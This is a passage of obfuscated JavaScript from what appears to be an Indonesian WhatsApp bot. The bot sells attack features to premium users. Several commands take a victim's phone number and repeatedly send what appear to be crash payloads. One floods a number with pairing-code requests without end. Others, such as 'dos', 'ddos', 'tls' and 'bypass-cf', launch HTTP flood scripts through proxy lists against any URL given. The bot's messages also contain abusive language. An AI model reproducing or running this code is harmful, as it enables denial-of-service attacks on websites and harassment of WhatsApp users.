            return _0x1d3510("Contoh : " + (_0x137417 + _0x53d4d1) + " dandelion");
          }
          let _0x5dfdae = await fetchJson("https://api.junn4.my.id/search/spotify?query=" + _0x3e94bb);
          const _0x59d3a7 = "乂 *S P O T I F Y*\n\n*Title*: " + _0x5dfdae.data[0].title + "\n*Duration*: " + _0x5dfdae.data[0].duration + "\n*Popular*: " + _0x5dfdae.data[0].popularity + "\n*Url*: " + _0x5dfdae.data[0].url + "\n";
          const _0x3a30fc = {
            text: _0x59d3a7,
            contextInfo: {
              externalAdReply: {
                title: "𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘",
                body: "@Dáreen Albérich𓆰⸸𓆪sdeveloper",
                showAdAttribution: true,
                mediaType: 1,
                sourceUrl: "",
                thumbnailUrl: "https://files.catbox.moe/m6wbpq.jpg",
                renderLargerThumbnail: true
              }
            }
          };
          const _0x1148e4 = {
            quoted: _0x568be6
          };
          _0x221ba4.sendMessage(_0x4611fa.chat, _0x3a30fc, _0x1148e4);
          const _0xf627ba = await fetchJson("https://api.junn4.my.id/download/spotify?url=" + _0x5dfdae.data[0].url);
          const _0x227b83 = _0xf627ba.data.download;
          const _0x4515de = {
            url: _0x227b83
          };
          const _0x19aaf8 = {
            audio: _0x4515de,
            mimetype: "audio/mpeg",
            contextInfo: {}
          };
          _0x19aaf8.contextInfo.externalAdReply = {};
          _0x19aaf8.contextInfo.externalAdReply.title = "𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘";
          _0x19aaf8.contextInfo.externalAdReply.body = "";
          _0x19aaf8.contextInfo.externalAdReply.thumbnailUrl = "https://files.catbox.moe/m6wbpq.jpg";
          _0x19aaf8.contextInfo.externalAdReply.sourceUrl = _0x59d242;
          _0x19aaf8.contextInfo.externalAdReply.mediaType = 1;
          _0x19aaf8.contextInfo.externalAdReply.showAdAttribution = true;
          _0x19aaf8.contextInfo.externalAdReply.renderLargerThumbnail = true;
          const _0x577b11 = {
            quoted: _0x568be6
          };
          _0x221ba4.sendMessage(_0x4611fa.chat, _0x19aaf8, _0x577b11);
        }
        break;
      case "delcase":
        {
          if (!_0x2db258) {
            return _0x1d3510("*Access Denied ❌*\n\n*Owners only*");
          }
          if (!q) {
            return _0x1d3510("*Masukan nama case yang akan di hapus*");
          }
          _0x19bfe9("./xzanss.js", q);
          _0x1d3510("*Dellcase Successfully*\n\n© Dellcase By Velzdev");
        }
        break;
      case "addcase":
        {
          if (!_0x1220c9) {
            return _0x1d3510("lu sapa asu");
          }
          if (!_0x3e94bb) {
            return _0x1d3510("Mana case nya");
          }
          const _0x31f6bc = require("fs");
          const _0x406ce4 = "xzanss.js";
          const _0x1c8511 = _0x3e94bb;
          _0x31f6bc.readFile(_0x406ce4, "utf8", (_0x5b5698, _0x14b7a6) => {
            if (_0x5b5698) {
              console.error("Terjadi kesalahan saat membaca file:", _0x5b5698);
              return;
            }
            const _0x388f42 = _0x14b7a6.indexOf("case 'addcase':");
            if (_0x388f42 !== -1) {
              const _0x5c6493 = _0x14b7a6.slice(0, _0x388f42) + "\n" + _0x1c8511 + "\n" + _0x14b7a6.slice(_0x388f42);
              _0x31f6bc.writeFile(_0x406ce4, _0x5c6493, "utf8", _0x439596 => {
                if (_0x439596) {
                  _0x1d3510("Terjadi kesalahan saat menulis file:", _0x439596);
                } else {
                  _0x1d3510("Case baru berhasil ditambahkan.");
                }
              });
            } else {
              _0x1d3510("Tidak dapat menambahkan case dalam file.");
            }
          });
        }
        break;
      case "dor": case "damn":
        if (!_0x428d53 && !_0x1220c9 && !_0x313f24) {
          return _0x1d3510(mess.only.premium);
        }
        if (!q) {
          return _0x1d3510("Example: " + (_0x137417 + _0x53d4d1) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x1d3510(_0x1800e6);
        for (let _0x551692 = 0; _0x551692 < 50; _0x551692++) {
          await _0x7eeee2(_0x221ba4, target, "p", 1020000, ptcp = true);
          await _0x3ae0e1(target, _0x49a4ac);
          await sleep(1500);
          await _0x3ae0e1(target, _0x49a4ac);
          await _0x5a1026(_0x221ba4, target, _0x49a4ac);
          await sleep(1500);
          await _0x37ae83(target, _0x49a4ac);
          await _0x420cc8(_0x221ba4, target, _0x49a4ac);
        }
        await sleep(1500);
        break;
      case "enyahlah": case "fuck":
        if (!_0x428d53 && !_0x1220c9 && !_0x313f24) {
          return _0x1d3510(mess.only.premium);
        }
        if (!q) {
          return _0x1d3510("Example: " + (_0x137417 + _0x53d4d1) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x1d3510(_0x3c3f2e);
        for (let _0x428e99 = 0; _0x428e99 < 50; _0x428e99++) {
          await _0x7eeee2(_0x221ba4, target, "p", 1020000, ptcp = true);
          await sleep(2000);
          await _0x2d570b(target, ptcp = true);
          await _0x11049b(target, _0x1de016);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x452809(target, _0x4511b8);
          await _0x11049b(target, _0x1de016);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x2635a7(target, _0x49a4ac);
          await _0x2d570b(target, ptcp = true);
          await _0x452809(target, _0x4511b8);
          await _0x11049b(target, _0x1de016);
          await sleep(2000);
          await _0x2635a7(target, _0x49a4ac);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x11049b(target, _0x49a4ac);
          await _0x3ae0e1(target, _0x49a4ac);
          await _0x3ae0e1(target, _0x49a4ac);
          await sleep(2000);
          await _0x5a1026(_0x221ba4, target, _0x49a4ac);
          await _0x452809(target, _0x49a4ac);
          await _0x7eeee2(_0x221ba4, target, "p", 1020000, ptcp = true);
          await sleep(2000);
          await _0x2d570b(target, ptcp = true);
          await _0x11049b(target, _0x1de016);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x452809(target, _0x4511b8);
          await _0x11049b(target, _0x1de016);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x2635a7(target, _0x49a4ac);
          await _0x2d570b(target, ptcp = true);
          await _0x452809(target, _0x4511b8);
          await _0x11049b(target, _0x1de016);
          await sleep(2000);
          await _0x2635a7(target, _0x49a4ac);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x11049b(target, _0x49a4ac);
          await _0x3ae0e1(target, _0x49a4ac);
          await _0x3ae0e1(target, _0x49a4ac);
          await sleep(2000);
          await _0x5a1026(_0x221ba4, target, _0x49a4ac);
          await _0x452809(target, _0x49a4ac);
          await sleep(2000);
          await _0x37ae83(target, _0x49a4ac);
          await sleep(2000);
          await _0x420cc8(_0x221ba4, target, _0x49a4ac);
          await _0x2d570b(target, ptcp = true);
          await _0x452809(target, _0x4511b8);
          await _0x11049b(target, _0x1de016);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x2d570b(target, "p", 1020000, ptcp = true);
          await _0x11049b(target, _0x1de016);
          await _0x2d570b(target, ptcp = true);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x2d570b(target, "p", 1020000, ptcp = true);
          await _0x11049b(target, _0x1de016);
          await _0x2d570b(target, ptcp = true);
          await _0x11049b(target, _0x1de016);
          await sleep(2000);
          await _0x452809(target, _0x4511b8);
          await _0x11049b(target, _0x1de016);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x2635a7(target, _0x49a4ac);
          await _0x2d570b(target, "p", 1020000, ptcp = true);
          await _0x2d570b(target, ptcp = true);
          await _0x452809(target, _0x4511b8);
          await _0x11049b(target, _0x1de016);
          await sleep(2000);
          await _0x2635a7(target, _0x49a4ac);
          await _0x2d570b(target, ptcp = true);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x2635a7(target, _0x49a4ac);
          await _0x2d570b(target, ptcp = true);
          await _0x452809(target, _0x4511b8);
          await _0x11049b(target, _0x1de016);
          await sleep(2000);
          await _0x2635a7(target, _0x49a4ac);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x11049b(target, _0x49a4ac);
          await _0x3ae0e1(target, _0x49a4ac);
          await _0x3ae0e1(target, _0x49a4ac);
          await sleep(2000);
          await _0x5a1026(_0x221ba4, target, _0x49a4ac);
          await _0x452809(target, _0x49a4ac);
          await sleep(2000);
          await _0x37ae83(target, _0x49a4ac);
          await sleep(2000);
          await _0x420cc8(_0x221ba4, target, _0x49a4ac);
          await _0x2d570b(target, ptcp = true);
        }
        await sleep(1500);
        break;
      case "cuih": case "alberich":
        if (!_0x428d53 && !_0x1220c9 && !_0x313f24) {
          return _0x1d3510(mess.only.premium);
        }
        if (!q) {
          return _0x1d3510("Example: " + (_0x137417 + _0x53d4d1) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x1d3510(_0x279b19);
        for (let _0xa0fa3 = 0; _0xa0fa3 < 50; _0xa0fa3++) {
          await _0x2d570b(target, "p", 1020000, ptcp = true);
          await _0x11049b(target, _0x1de016);
          await _0x2d570b(target, ptcp = true);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x2d570b(target, "p", 1020000, ptcp = true);
          await _0x11049b(target, _0x1de016);
          await _0x2d570b(target, ptcp = true);
          await _0x11049b(target, _0x1de016);
          await sleep(2000);
          await _0x452809(target, _0x4511b8);
          await _0x11049b(target, _0x1de016);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x2635a7(target, _0x49a4ac);
          await _0x2d570b(target, ptcp = true);
          await _0x452809(target, _0x4511b8);
          await _0x11049b(target, _0x1de016);
          await sleep(2000);
          await _0x2635a7(target, _0x49a4ac);
          await _0x2d570b(target, ptcp = true);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
          await _0x2d570b(target, ptcp = true);
          await sleep(2000);
        }
        break;
      case "imdareen": case "dor":
        if (!_0x428d53 && !_0x1220c9) {
          return _0x1d3510(mess.only.premium);
        }
        if (!_0xc70d8c) {
          return _0x1d3510("Khusus private chat");
        }
        _0x1d3510(_0x279b19);
        for (let _0x53d0eb = 0; _0x53d0eb < 50; _0x53d0eb++) {
          await _0x2d570b("p", 1020000, ptcp = true);
          await _0x11049b(_0x1de016);
          await _0x2d570b(ptcp = true);
          await _0x11049b(_0x1de016);
          await sleep(1500);
          await _0x452809(_0x4511b8);
          await _0x11049b(_0x1de016);
          await _0x2d570b(ptcp = true);
          await sleep(1500);
        }
        break;
      case "spampair":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return replyzz("Fitur ini hanya untuk pengguna Premium.");
          }
          if (!q) {
            return _0x1d3510("Contoh: " + (_0x137417 + _0x53d4d1) + " 62xxxxx");
          }
          await _0x221ba4.sendMessage(_0x4611fa.chat, {
            react: {
              text: "✅",
              key: _0x4611fa.key
            }
          });
          let _0x3446bb = q.replace(/[^0-9]/g, "").trim();
          let {
            default: _0x41ace6,
            useMultiFileAuthState: _0x2f32e2,
            fetchLatestBaileysVersion: _0x5065b1
          } = require("@whiskeysockets/baileys");
          let {
            state: _0x58bd1f
          } = await _0x2f32e2("Dáreen Albérich𓆰⸸𓆪");
          let {
            version: _0x294922
          } = await _0x5065b1();
          let _0x2b4886 = await _0x41ace6({
            auth: _0x58bd1f,
            version: _0x294922,
            logger: pino2({
              level: "fatal"
            })
          });
          while (true) {
            for (let _0x173891 = 0; _0x173891 < 20; _0x173891++) {
              await sleep(3000);
              try {
                let _0x3d4194 = await _0x2b4886.requestPairingCode(_0x3446bb);
                console.log("# Succes Spam Pairing Code - Number : " + _0x3446bb + " - Code : " + _0x3d4194);
                await _0x2b4886.sendMessage(_0x3446bb, {
                  text: "Pairing Code: " + _0x3d4194
                });
              } catch (_0x3e49a4) {
                console.error("Error pada request pairing code: " + _0x3e49a4);
                if (_0x3e49a4.message.includes("Connection Closed")) {
                  console.log("Koneksi tertutup, mencoba reconnect...");
                  break;
                }
              }
            }
            await sleep(60000);
          }
        }
        break;
      case "dos":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x27b394 = q.split(" ")[0];
          let _0x24b378 = q.split(" ")[1] * 1000;
          if (_0x18d0e5.length === 2 && _0x27b394 && !isNaN(_0x24b378)) {
            let _0x7c4cb3 = () => {
              let _0x36a2da = 0;
              let _0x3d479e = [];
              for (let _0x827b23 = 0; _0x827b23 < 6; _0x827b23++) {
                _0x3d479e.push(new Promise((_0x438cd5, _0x155ab7) => {
                  let _0x4765ba = setInterval(() => {
                    for (let _0x5a714 = 0; _0x5a714 < 100; _0x5a714++) {
                      fetch(_0x27b394).then(() => {
                        _0x36a2da++;
                        console.log("Attacking => " + _0x27b394 + " Total Requests: " + _0x36a2da + " Duration: " + _0x24b378);
                      }).catch(_0x46258d => {});
                    }
                  }, 750);
                  setTimeout(() => {
                    clearInterval(_0x4765ba);
                    _0x438cd5();
                  }, _0x24b378);
                }));
              }
              Promise.all(_0x3d479e).then(() => console.log("Attack Complete")).catch(_0x8f83d9 => console.error("Error In Attack:", _0x8f83d9));
            };
            _0x7c4cb3();
          } else {
            _0x1d3510("Format Pesan Tidak Benar. Gunakan Format: Dos [Url] [Time]");
          }
        }
        break;
      case "ddos":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x1b9f94 = q.split(" ")[0];
          let _0x1acc76 = q.split(" ")[1];
          let _0x1a9aab = q.split(" ")[2];
          let _0x2afc27 = q.split(" ")[3];
          if (_0x18d0e5.length === 4 && _0x1b9f94 && _0x1acc76 && _0x1a9aab && _0x2afc27) {
            _0x1d3510("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x1b9f94 + " 🎭 Serangan Berlangsung Selama " + _0x1acc76 + " Detik.");
            exec("node ./ddos/hentai.js " + _0x1b9f94 + " " + _0x1acc76 + " " + _0x2afc27 + " " + _0x1a9aab + " proxy.txt", (_0x1579ae, _0x341b1b) => {
              if (_0x1579ae) {
                return console.log(_0x1579ae.toString());
              }
              if (_0x341b1b) {
                return console.log(util2.format(_0x341b1b));
              }
            });
          } else {
            _0x1d3510("Format Pesan Tidak Benar. Gunakan Format : Ddos [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "xc":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510(mess.only.premium);
          }
          let [_0x20ee16, _0xbefeae, _0x5b7507, _0x258d31, _0x4344fe] = q.split(" ");
          if (_0x18d0e5.length === 5 && _0x20ee16 && _0xbefeae && _0x5b7507 && _0x258d31 && _0x4344fe) {
            _0x1d3510("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju: " + _0x20ee16 + " 🎭 Serangan Berlangsung Selama " + _0xbefeae + " Detik.");
            exec("node ./ddos/LC.js " + _0x20ee16 + " " + _0xbefeae + " " + _0x5b7507 + " " + _0x258d31 + " proxy.txt", (_0x483ca9, _0x670ca1) => {
              if (_0x483ca9) {
                return console.log(_0x483ca9.toString());
              }
              if (_0x670ca1) {
                return console.log(util2.format(_0x670ca1));
              }
            });
          } else {
            _0x1d3510("Format Pesan Tidak Benar. Gunakan Format: Xc [Url] [Time] [Rate] [Thread] [ProxyFile]");
          }
        }
        break;
      case "mix":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510(mess.only.premium);
          }
          let _0xfc6b10 = q.split(" ")[0];
          let _0x142214 = q.split(" ")[1];
          let _0x789b2 = q.split(" ")[2];
          let _0x4578b2 = q.split(" ")[3];
          if (_0x18d0e5.length === 4 && _0xfc6b10 && _0x142214 && _0x789b2 && _0x4578b2) {
            _0x1d3510("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0xfc6b10 + " 🎭 Serangan Berlangsung Selama " + _0x142214 + " Detik.");
            exec("node ./ddos/mix.js " + _0xfc6b10 + " " + _0x142214 + " " + _0x789b2 + " " + _0x4578b2, (_0x327d1d, _0x521dec) => {
              if (_0x327d1d) {
                return console.log(_0x327d1d.toString());
              }
              if (_0x521dec) {
                return console.log(util2.format(_0x521dec));
              }
            });
          } else {
            _0x1d3510("Format Pesan Tidak Benar. Gunakan Format : Mix [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "floods":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x5e27b7 = q.split(" ")[0];
          let _0x7de3bb = q.split(" ")[1];
          let _0x4c72da = q.split(" ")[2];
          let _0xe8f15b = q.split(" ")[3];
          if (_0x18d0e5.length === 4 && _0x5e27b7 && _0x7de3bb && _0x4c72da && _0xe8f15b) {
            _0x1d3510("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x5e27b7 + " 🎭 Serangan Berlangsung Selama " + _0x7de3bb + " Detik.");
            exec("node ./ddos/floods.js " + _0x5e27b7 + " " + _0x7de3bb + " " + _0xe8f15b + " " + _0x4c72da + " proxy.txt", (_0x28c7a4, _0x5b0f00) => {
              if (_0x28c7a4) {
                return console.log(_0x28c7a4.toString());
              }
              if (_0x5b0f00) {
                return console.log(util2.format(_0x5b0f00));
              }
            });
          } else {
            _0x1d3510("Format Pesan Tidak Benar. Gunakan Format : Floods [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "ua":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x2b0e85 = q.split(" ")[0];
          let _0x2030eb = q.split(" ")[1];
          let _0x2e8ff0 = q.split(" ")[2];
          let _0x373c33 = q.split(" ")[3];
          if (_0x18d0e5.length === 4 && _0x2b0e85 && _0x2030eb && _0x2e8ff0 && _0x373c33) {
            _0x1d3510("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x2b0e85 + " 🎭 Serangan Berlangsung Selama " + _0x2030eb + " Detik.");
            exec("node ./ddos/kilua.js " + _0x2b0e85 + " " + _0x2030eb + " " + _0x2e8ff0 + " proxy.txt " + _0x373c33 + " ua.txt", (_0x320851, _0x3c6d5a) => {
              if (_0x320851) {
                return console.log(_0x320851.toString());
              }
              if (_0x3c6d5a) {
                return console.log(util2.format(_0x3c6d5a));
              }
            });
          } else {
            _0x1d3510("Format Pesan Tidak Benar. Gunakan Format : Ua [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "xchrome":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x33950a = q.split(" ")[0];
          let _0x3fb5e8 = q.split(" ")[1];
          let _0x262bcd = q.split(" ")[2];
          let _0x160c06 = q.split(" ")[3];
          if (_0x18d0e5.length === 4 && _0x33950a && _0x3fb5e8 && _0x262bcd && _0x160c06) {
            _0x1d3510("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x33950a + " 🎭 Serangan Berlangsung Selama " + _0x3fb5e8 + " Detik.");
            exec("node ./ddos/chromev3.js " + _0x33950a + " " + _0x3fb5e8 + " " + _0x160c06 + " " + _0x262bcd + " proxy.txt", (_0x32b205, _0xeb9fa5) => {
              if (_0x32b205) {
                return console.log(_0x32b205.toString());
              }
              if (_0xeb9fa5) {
                return console.log(util2.format(_0xeb9fa5));
              }
            });
          } else {
            _0x1d3510("Format Pesan Tidak Benar. Gunakan Format Xchrome [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tls":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x46ab6d = q.split(" ")[0];
          let _0x3da501 = q.split(" ")[1];
          let _0x2c3f26 = q.split(" ")[2];
          let _0x22bfb7 = q.split(" ")[3];
          if (_0x18d0e5.length === 4 && _0x46ab6d && _0x3da501 && _0x2c3f26 && _0x22bfb7) {
            _0x1d3510("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x46ab6d + " 🎭 Serangan Berlangsung Selama " + _0x3da501 + " Detik.");
            exec("node ./ddos/tls-arz.js " + _0x46ab6d + " " + _0x3da501 + " " + _0x22bfb7 + " " + _0x2c3f26 + " proxy.txt", (_0x55c866, _0x6d470f) => {
              if (_0x55c866) {
                return console.log(_0x55c866.toString());
              }
              if (_0x6d470f) {
                return console.log(util2.format(_0x6d470f));
              }
            });
          } else {
            _0x1d3510("Format Pesan Tidak Benar. Gunakan Format Tls [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tlsbypass":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x5dd661 = q.split(" ")[0];
          let _0x3cc800 = q.split(" ")[1];
          let _0x2fd8db = q.split(" ")[2];
          let _0x2966b1 = q.split(" ")[3];
          if (_0x18d0e5.length === 4 && _0x5dd661 && _0x3cc800 && _0x2fd8db && _0x2966b1) {
            _0x1d3510("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x5dd661 + " 🎭 Serangan Berlangsung Selama " + _0x3cc800 + " Detik.");
            exec("node ./ddos/tls-bypass.js " + _0x5dd661 + " " + _0x3cc800 + " " + _0x2966b1 + " " + _0x2fd8db, (_0x7f6b59, _0x4a5b17) => {
              if (_0x7f6b59) {
                return console.log(_0x7f6b59.toString());
              }
              if (_0x4a5b17) {
                return console.log(util2.format(_0x4a5b17));
              }
            });
          } else {
            _0x1d3510("Format Pesan Tidak Benar. Gunakan Format Tlsbypass [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tlsv2":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x74306c = q.split(" ")[0];
          let _0x318925 = q.split(" ")[1];
          let _0x9f63d3 = q.split(" ")[2];
          let _0x50b9bf = q.split(" ")[3];
          if (_0x18d0e5.length === 4 && _0x74306c && _0x318925 && _0x9f63d3 && _0x50b9bf) {
            _0x1d3510("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x74306c + " 🎭 Serangan Berlangsung Selama " + _0x318925 + " Detik.");
            exec("node ./ddos/tls.js " + _0x74306c + " " + _0x318925 + " " + _0x50b9bf + " " + _0x9f63d3 + " proxy.txt", (_0x4a965a, _0x40bf43) => {
              if (_0x4a965a) {
                return console.log(_0x4a965a.toString());
              }
              if (_0x40bf43) {
                return console.log(util2.format(_0x40bf43));
              }
            });
          } else {
            _0x1d3510("Format Pesan Tidak Benar. Gunakan Format Tlsv2 [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "bypass-cf":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x10845e = q.split(" ")[0];
          let _0x3a043d = q.split(" ")[1];
          let _0x3a9228 = q.split(" ")[2];
          let _0x2dec5c = q.split(" ")[3];
          if (_0x18d0e5.length === 4 && _0x10845e && _0x3a043d && _0x3a9228 && _0x2dec5c) {
            _0x1d3510("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x10845e + " 🎭 Serangan Berlangsung Selama " + _0x3a043d + " Detik.");
            exec("node ./ddos/bypass.js " + _0x10845e + " " + _0x3a043d + " " + _0x2dec5c + " " + _0x3a9228 + " proxy.txt", (_0x1f91e9, _0x52469c) => {
              if (_0x1f91e9) {
                return console.log(_0x1f91e9.toString());
              }
              if (_0x52469c) {
                return console.log(util2.format(_0x52469c));
              }
            });
          } else {
            _0x1d3510("Format Pesan Tidak Benar. Gunakan Format : Bypass-cf [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tls-vip":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x53b66f = q.split(" ")[0];
          let _0x570a0a = q.split(" ")[1];
          let _0x142743 = q.split(" ")[2];
          let _0x4e20f4 = q.split(" ")[3];
          if (_0x18d0e5.length === 4 && _0x53b66f && _0x570a0a && _0x142743 && _0x4e20f4) {
            _0x1d3510("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x53b66f + " 🎭 Serangan Berlangsung Selama " + _0x570a0a + " Detik.");
            exec("node ./ddos/tlsvip.js " + _0x53b66f + " " + _0x570a0a + " " + _0x4e20f4 + " " + _0x142743 + " proxy.txt", (_0x595ce7, _0x42cfbc) => {
              if (_0x595ce7) {
                return console.log(_0x595ce7.toString());
              }
              if (_0x42cfbc) {
                return console.log(util2.format(_0x42cfbc));
              }
            });
          } else {
            _0x1d3510("Format Pesan Tidak Benar. Gunakan Format Tls-vip [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "addseller":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          if (!_0x18d0e5[0]) {
            return _0x1d3510("Penggunaan " + (_0x137417 + _0x53d4d1) + " nomor\nContoh " + (_0x137417 + _0x53d4d1) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x84f10f = await _0x221ba4.onWhatsApp(prrkek);
          if (_0x84f10f.length == 0) {
            return _0x1d3510("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          _0x165e4a.push(prrkek);
          fs3.writeFileSync("./database/premium.json", JSON.stringify(_0x165e4a));
          _0x1d3510("Nomor " + prrkek + " Telah Menjadi Reseller Panel!");
        }
        break;
      case "hambadareen":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          if (!_0x18d0e5[0]) {
            return _0x1d3510("Penggunaan " + (_0x137417 + _0x53d4d1) + " nomor\nContoh " + (_0x137417 + _0x53d4d1) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x2c0e = await _0x221ba4.onWhatsApp(prrkek);
          if (_0x2c0e.length == 0) {
            return _0x1d3510("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          _0x165e4a.push(prrkek);
          fs3.writeFileSync("./database/premium.json", JSON.stringify(_0x165e4a));
          _0x1d3510("Nomor " + prrkek + " Telah Menjadi Premium!");
        }
        break;
      case "addhamba":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          if (!_0x18d0e5[0]) {
            return _0x1d3510("Penggunaan " + (_0x137417 + _0x53d4d1) + " nomor\nContoh " + (_0x137417 + _0x53d4d1) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x187079 = await _0x221ba4.onWhatsApp(prrkek);
          if (_0x187079.length == 0) {
            return _0x1d3510("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          _0x165e4a.push(prrkek);
          fs3.writeFileSync("./database/premium.json", JSON.stringify(_0x165e4a));
          _0x1d3510("Nomor " + prrkek + " Telah Menjadi Murbug");
        }
        break;
      case "hapushamba":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          if (!_0x18d0e5[0]) {
            return _0x1d3510("Penggunaan " + (_0x137417 + _0x53d4d1) + " nomor\nContoh " + (_0x137417 + _0x53d4d1) + " 6285156726377");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = _0x165e4a.indexOf(bro);
          _0x165e4a.splice(unp, 1);
          fs3.writeFileSync("./database/premium.json", JSON.stringify(_0x165e4a));
          _0x1d3510("Nomor " + bro + " Telah Di Hapus Premium!");
        }
        break;
      case "delseller":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          if (!_0x18d0e5[0]) {
            return _0x1d3510("Penggunaan " + (_0x137417 + _0x53d4d1) + " nomor\nContoh " + (_0x137417 + _0x53d4d1) + " 6285156726377");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = _0x165e4a.indexOf(bro);
          _0x165e4a.splice(unp, 1);
          fs3.writeFileSync("./database/premium.json", JSON.stringify(_0x165e4a));
          _0x1d3510("Nomor " + bro + " Telah Di Hapus Seller");
        }
        break;
      case "hapushamba":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          if (!_0x18d0e5[0]) {
            return _0x1d3510("Penggunaan " + (_0x137417 + _0x53d4d1) + " nomor\nContoh " + (_0x137417 + _0x53d4d1) + " 6285156726377");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = _0x165e4a.indexOf(bro);
          _0x165e4a.splice(unp, 1);
          fs3.writeFileSync("./database/premium.json", JSON.stringify(_0x165e4a));
          _0x1d3510("Nomor " + bro + " Telah Di Hapus Murbug!");
        }
        break;
      case "addown":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          if (!_0x18d0e5[0]) {
            return _0x1d3510("Penggunaan " + (_0x137417 + _0x53d4d1) + " nomor\nContoh " + (_0x137417 + _0x53d4d1) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x2a9795 = await _0x221ba4.onWhatsApp(prrkek);
          if (_0x2a9795.length == 0) {
            return _0x1d3510("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          _0x37e54b.push(prrkek);
          fs3.writeFileSync("./database/owner.json", JSON.stringify(_0x37e54b));
          _0x1d3510("Nomor " + prrkek + " Telah Menjadi Own Panel!");
        }
        break;
      case "delown":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          if (!_0x18d0e5[0]) {
